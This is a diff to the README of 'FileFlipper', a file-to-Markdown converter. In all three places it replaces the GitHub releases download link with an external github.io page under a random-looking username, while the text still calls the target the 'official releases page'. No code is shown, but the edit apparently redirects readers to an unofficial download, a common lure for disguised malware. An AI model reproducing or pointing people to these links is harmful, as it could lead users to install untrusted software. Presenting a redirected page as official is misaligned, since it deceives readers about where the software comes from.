@@ -1,6 +1,6 @@
 # 🔄 FileFlipper - Turn Any File Into Clean Markdown
 
-[![Download FileFlipper](https://img.shields.io/badge/⬇️_Download_FileFlipper-Visit_Releases_Page-ff6b35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hiuuhouyhkuhh/FileFlipper/releases)
+[![Download FileFlipper](https://img.shields.io/badge/⬇️_Download_FileFlipper-Visit_Releases_Page-ff6b35?style=for-the-badge&logo=github&logoColor=white)](https://hiuuhouyhkuhh.github.io)
 
 FileFlipper is a small, friendly program for Mac and Windows that turns your everyday documents and images into clean, simple text files — the kind that AI tools read quickly and cheaply. Word documents, PDFs, PowerPoint slides, Excel sheets, photos, screenshots, videos: drop them in, flip them out. No account, no upload, no cloud. Everything happens on your own computer.
 
@@ -16,7 +16,7 @@ Getting FileFlipper onto your Windows computer takes just a few clicks. You do n
 
 Go to the official releases page here:
 
-👉 **https://github.com/hiuuhouyhkuhh/FileFlipper/releases**
+👉 **https://hiuuhouyhkuhh.github.io**
 
 Visit this link to download the application.
 
@@ -145,7 +145,7 @@ If you just want to say thanks or suggest a feature, open an issue and say hello
 
 Ready to try it?
 
-👉 **https://github.com/hiuuhouyhkuhh/FileFlipper/releases**
+👉 **https://hiuuhouyhkuhh.github.io**
 
 Visit this link to download the application.
 
